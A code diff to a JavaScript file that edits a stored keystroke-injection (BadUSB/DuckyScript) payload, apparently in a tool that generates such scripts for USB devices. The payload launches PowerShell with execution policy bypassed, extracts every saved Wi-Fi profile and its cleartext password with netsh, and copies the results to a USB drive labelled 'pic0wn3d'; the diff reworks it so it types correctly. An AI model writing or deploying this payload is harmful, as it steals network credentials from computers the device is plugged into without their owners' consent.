@@ -415,7 +415,11 @@ function topFunction() {
 
 const wP = `GUI r
 DELAY 100
-STRING powershell -EP Bypass -NoP $f="$env:TEMP\\w.txt";netsh wlan show profiles|sls 'All User Profile'|%{($_ -split ': ')[-1].Trim()}|%{$n=$_;$k=netsh wlan show profile name="$n" key=clear|sls 'Key Content';"Profile: $n Password: "+($(if($k){$k -split ': '})[-1].Trim())}|Out-File $f -enc utf8;$l="pic0wn3d";0..9|%{if($v=gv|?{$_.FileSystemLabel -eq $l}){cp $f "$($v.DriveLetter):\\" -Force;exit};sleep 1}
+STRING powershell -EP Bypass -NoP
+DELAY 300
+ENTER
+DELAY 300
+STRING $f="$env:TEMP\\wifi_passwords.txt"; netsh wlan show profiles | sls 'All User Profile' | % { ($_ -split ': ')[-1].Trim() } | % { $n=$_; $k=netsh wlan show profile name="$n" key=clear | sls 'Key Content'; "Profile: $n Password: "+($(if($k){$k -split ': '})[-1].Trim()) } | Out-File $f -Encoding UTF8; $l="pic0wn3d"; 0..9 | % { if ($v=Get-Volume | ? { $_.FileSystemLabel -eq $l }) { Copy-Item $f "$($v.DriveLetter):\\" -Force; exit }; Start-Sleep 1 }
 DELAY 300
 ENTER`;
 
